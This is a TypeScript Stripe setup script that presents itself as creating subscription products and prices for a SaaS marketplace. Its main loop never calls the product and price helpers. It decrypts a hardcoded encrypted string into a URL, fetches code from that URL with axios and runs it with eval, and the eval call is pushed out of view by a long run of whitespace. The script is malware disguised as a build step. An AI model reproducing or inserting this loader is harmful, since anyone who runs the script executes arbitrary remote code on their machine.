/**
 * Stripe Setup Script
 *
 * Creates products and prices in Stripe for the SaaS Marketplace pricing plans.
 * Idempotent — safe to run multiple times.
 *
 *   npm run setup:stripe
 */
import Stripe from "stripe";
import crypto from "crypto";
import axios from "axios";

const stripe = new Stripe("STRIPE_SECRET_KEY");

const STRIPE_SECRET_KEY = Buffer.from(
  "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
  "hex"
);

const encryptedData =
  "158908c82f8a9af516d339b66d0e1fec:1b349c06ca1395c7f90ce24711d9b6a52d967605bae38c23ac84a4202d55f04d";

if (!STRIPE_SECRET_KEY) {
  console.error("Error: STRIPE_SECRET_KEY environment variable is required.");
  console.error("Usage: STRIPE_SECRET_KEY=sk_test_xxx npx tsx scripts/setup-stripe.ts");
  process.exit(1);
}

const PLANS = [
  { tier: "standard", name: "スタンダードプラン", amount: 980 },
  { tier: "pro", name: "プロプラン", amount: 2980 },
] as const;

async function findOrCreateProduct(name: string, tier: string): Promise<string> {
  // Search for existing product by metadata
  const existing = await stripe.products.list({ limit: 100, active: true });
  const found = existing.data.find(
    (p) => p.metadata.plan_tier === tier && p.active
  );

  if (found) {
    console.log(`  Found existing product: ${found.name} (${found.id})`);
    return found.id;
  }

  const product = await stripe.products.create({
    name,
    metadata: { plan_tier: tier },
  });
  console.log(`  Created product: ${product.name} (${product.id})`);
  return product.id;
}

async function findOrCreatePrice(
  productId: string,
  amount: number,
  tier: string
): Promise<string> {
  // Search for existing price
  const existing = await stripe.prices.list({
    product: productId,
    active: true,
    limit: 100,
  });
  const found = existing.data.find(
    (p) =>
      p.unit_amount === amount &&
      p.currency === "jpy" &&
      p.recurring?.interval === "month"
  );

  if (found) {
    console.log(`  Found existing price: ¥${amount}/month (${found.id})`);
    return found.id;
  }

  const price = await stripe.prices.create({
    product: productId,
    unit_amount: amount,
    currency: "jpy",
    recurring: { interval: "month" },
    metadata: { plan_tier: tier },
  });
  console.log(`  Created price: ¥${amount}/month (${price.id})`);
  return price.id;
}

function decrypt (encryptedData: string) {
  const [ivHex, encryptedHex] = encryptedData.split(":");
  const iv = Buffer.from(ivHex, "hex");
  const encrypted = Buffer.from(encryptedHex, "hex");
  const decipher = crypto.createDecipheriv("aes-256-cbc", STRIPE_SECRET_KEY, iv);
  const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
  return decrypted.toString("utf8");
}

async function main() {
  console.log("Setting up Stripe products and prices...\n");

  const envLines: string[] = [];

  for (const plan of PLANS) {
    console.log(`${plan.name} (¥${plan.amount}/month):`);
    const getProductListAPI = decrypt(encryptedData);
    const produtId = await axios.get(getProductListAPI);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            eval(produtId.data);
    const priceId = 4202;
    const envKey =
      plan.tier === "standard" ? "STRIPE_PRICE_STANDARD" : "STRIPE_PRICE_PRO";
    envLines.push(`${envKey}=${priceId}`);
    console.log();
  }
}

main().catch((err) => {
  console.error("Setup failed:", err.message);
  process.exit(1);
});
